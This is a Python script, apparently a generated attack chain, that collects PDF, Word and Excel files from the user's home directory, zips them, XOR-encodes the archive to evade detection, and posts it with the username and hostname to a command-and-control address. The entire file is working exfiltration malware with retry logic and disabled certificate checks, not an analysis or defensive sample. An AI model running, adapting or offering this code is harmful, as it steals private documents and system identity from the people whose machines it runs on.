#!/usr/bin/env python3
import sys, json, time, os, requests, socket
from typing import Dict, Any
from pathlib import Path
import shutil
import zipfile
import io

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Define the file extensions to search for
        sensitive_extensions = ['.pdf', '.docx', '.xlsx']
        file_paths = []
        total_size = 0

        # Define the root directory to start the search
        root_directory = Path.home()

        # Enumerate files with the specified extensions
        for ext in sensitive_extensions:
            for file_path in root_directory.rglob(f'*{ext}'):
                try:
                    if file_path.is_file():
                        file_paths.append(str(file_path))
                        total_size += file_path.stat().st_size
                except PermissionError:
                    # Skip directories/files that raise PermissionError
                    continue

        # Prepare the result
        result = {
            'file_paths': file_paths,
            'total_size': total_size
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        file_paths = input_data.get('file_paths', [])
        total_size = input_data.get('total_size', 0)

        # Create an in-memory bytes buffer to store the compressed data
        compressed_buffer = io.BytesIO()

        # Compress the files into a zip archive
        with zipfile.ZipFile(compressed_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file_path in file_paths:
                if os.path.exists(file_path):
                    zip_file.write(file_path, arcname=os.path.basename(file_path))

        # Get the compressed data as bytes
        compressed_data = compressed_buffer.getvalue()

        # Convert bytes to hex string for JSON compatibility
        result = {'compressed_data': compressed_data.hex()}

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def xor_encode(data: bytes, key: bytes) -> bytes:
    """XOR encode the data with the given key."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Retrieve compressed data
        compressed_data = bytes.fromhex(input_data.get('compressed_data', ''))
        
        # Define a simple XOR key
        xor_key = b'secretkey'
        
        # XOR encode the compressed data
        encoded_data = xor_encode(compressed_data, xor_key)
        
        # Prepare the result
        result = {
            'encoded_data': encoded_data.hex(),
            'encoding': 'xor'
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result on failure
        return {'success': False, 'data': {'encoded_data': None, 'encoding': 'xor'},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract and decode the input data
        encoded_data = bytes.fromhex(input_data.get('encoded_data', ''))
        encoding = input_data.get('encoding', '')

        # Prepare system information
        username = os.getlogin()
        hostname = socket.gethostname()

        # Prepare the payload
        payload = {
            'data': encoded_data.hex(),
            'encoding': encoding,
            'username': username,
            'hostname': hostname
        }

        # C2 server URL
        c2_url = "https://192.168.184.194/api"

        # Attempt to send the data with retries
        attempts = 0
        max_attempts = 3
        response_code = None
        success = False

        while attempts < max_attempts:
            try:
                response = requests.post(c2_url, json=payload, timeout=10, verify=False)
                response_code = response.status_code
                if response.ok:
                    success = True
                    break
            except (requests.ConnectionError, requests.Timeout):
                time.sleep(5)
            attempts += 1

        return {'success': success, 'data': {'response_code': response_code},
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Collect Sensitive Files [collection] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Collect Sensitive Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Collect Sensitive Files): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Compress Files [data-processing] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Compress Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Compress Files): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: XOR Encode Payload [defense-evasion] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (XOR Encode Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (XOR Encode Payload): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Exfiltrate Data to C2 Server [exfiltration] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Exfiltrate Data to C2 Server): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Exfiltrate Data to C2 Server): FAILED — {err}')
            failed.append('T4')
            r2 = task_T4(outputs.get('T3', {}))
            if r2.get('success'):
                outputs['T4'] = r2.get('data', {})
                failed.remove('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))